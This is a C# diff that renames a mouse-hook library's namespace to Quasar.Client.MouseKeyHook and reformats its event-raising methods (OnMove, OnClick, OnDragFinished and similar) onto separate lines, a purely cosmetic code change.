@@ -5,9 +5,9 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-using Gma.System.MouseKeyHook.WinApi;
+using Quasar.Client.MouseKeyHook.WinApi;
 
-namespace Gma.System.MouseKeyHook.Implementation
+namespace Quasar.Client.MouseKeyHook.Implementation
 {
     // Because it is a P/Invoke method, 'GetSystemMetrics(int)'
     // should be defined in a class named NativeMethods, SafeNativeMethods,
@@ -232,97 +232,113 @@ namespace Gma.System.MouseKeyHook.Implementation
         protected virtual void OnMove(MouseEventArgs e)
         {
             var handler = MouseMove;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnMoveExt(MouseEventExtArgs e)
         {
             var handler = MouseMoveExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnClick(MouseEventArgs e)
         {
             var handler = MouseClick;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDown(MouseEventArgs e)
         {
             var handler = MouseDown;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDownExt(MouseEventExtArgs e)
         {
             var handler = MouseDownExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnUp(MouseEventArgs e)
         {
             var handler = MouseUp;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnUpExt(MouseEventExtArgs e)
         {
             var handler = MouseUpExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnWheel(MouseEventArgs e)
         {
             var handler = MouseWheel;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnWheelExt(MouseEventExtArgs e)
         {
             var handler = MouseWheelExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnHWheel(MouseEventArgs e)
         {
             var handler = MouseHWheel;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnHWheelExt(MouseEventExtArgs e)
         {
             var handler = MouseHWheelExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDoubleClick(MouseEventArgs e)
         {
             var handler = MouseDoubleClick;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDragStarted(MouseEventArgs e)
         {
             var handler = MouseDragStarted;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDragStartedExt(MouseEventExtArgs e)
         {
             var handler = MouseDragStartedExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDragFinished(MouseEventArgs e)
         {
             var handler = MouseDragFinished;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
 
         protected virtual void OnDragFinishedExt(MouseEventExtArgs e)
         {
             var handler = MouseDragFinishedExt;
-            if (handler != null) handler(this, e);
+            if (handler != null)
+                handler(this, e);
         }
     }
 }
